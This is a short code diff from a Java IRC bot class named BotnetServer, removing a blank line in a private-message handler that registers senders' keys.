@@ -156,7 +156,6 @@ public class BotnetServer extends PircBot {
 	}
 	
 	protected void onPrivateMessage(String sender, String login, String hostname, String message) {
-		
 		if (message.toLowerCase().startsWith("key")) {
 			String[] parts = message.split(" ", 2);
 			if (!botKeys.containsKey(sender) && parts.length > 1) {
